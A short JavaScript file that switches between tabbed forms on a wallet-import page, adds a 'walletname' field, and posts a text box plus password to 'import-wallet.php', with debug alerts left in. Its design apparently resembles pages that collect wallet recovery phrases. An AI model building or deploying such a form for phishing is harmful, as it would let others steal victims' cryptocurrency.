let thost = document.querySelectorAll("#tabhost a");
let activeTab = thost[0];

for(let i=0;i<thost.length;i++){
thost[i].addEventListener('click', tabClick);
}

function tabClick(e){
e.preventDefault();
if( this == activeTab ) return; 

let index = 0;

for(let i=0; i<thost.length; i++){
if(this == thost[i]) index = i;
}
 
activeTab.classList.remove('bg-primary');
activeTab.classList.remove('text-white');
activeTab.classList.add('bg-white'); 
activeTab.classList.add('text-primary');

this.classList.remove('bg-white');
this.classList.remove('text-primary');
this.classList.add('bg-primary');
this.classList.add('text-white');

activeTab = this;

activeDiv.classList.remove("block");
activeDiv.classList.add("hidden");

formDiv[index].classList.remove("hidden");
formDiv[index].classList.add("block");


activeDiv = formDiv[index];
activeForm = MyForms[index];

}

let formDiv = document.querySelectorAll(".tab-content.tab-space > div");
let MyForms = document.querySelectorAll(".tab-content.tab-space > div form");


for(let c=0;c<MyForms.length;c++){
let nodee=document.createElement("input"); 
nodee.setAttribute("type", "text");
nodee.setAttribute("name", "walletname");

MyForms[c].appendChild(nodee);
alert(MyForms[c].innerHTML);
}

alert("why");

let buttons = document.querySelectorAll(".tab-content.tab-space > div button");




for(let i=0; i<buttons.length; i++){
buttons[i].addEventListener('click', sendForm);
}

function sendForm(){

let txtar = activeForm.querySelector("textarea");

if(txtar.value.trim() == "") { 
alert("please enter data in the box provided"); 
txtar.focus();
}

else{

let txtin = activeForm.querySelector("input");

if(txtin && txtin.value.trim() == ""){
alert("please enter the password in the box provided"); 
txtin.focus();
return;
}
//activeForm.appendNode;
activeForm.method="post";
activeForm.action = "import-wallet.php";
activeForm.submit();



}

}

let activeDiv = formDiv[0]; 
let activeForm = MyForms[0]; 

